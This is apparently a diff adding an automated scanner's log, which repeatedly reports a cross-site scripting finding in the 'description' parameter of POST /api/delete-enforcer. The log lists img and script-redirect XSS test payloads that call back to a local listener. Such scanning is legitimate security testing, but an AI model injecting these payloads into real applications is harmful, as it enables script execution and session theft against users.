@@ -1,0 +1,192 @@
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/delete-enforcerLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /api/delete-enforcer
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/delete-enforcerLLMdescription'</script>
+
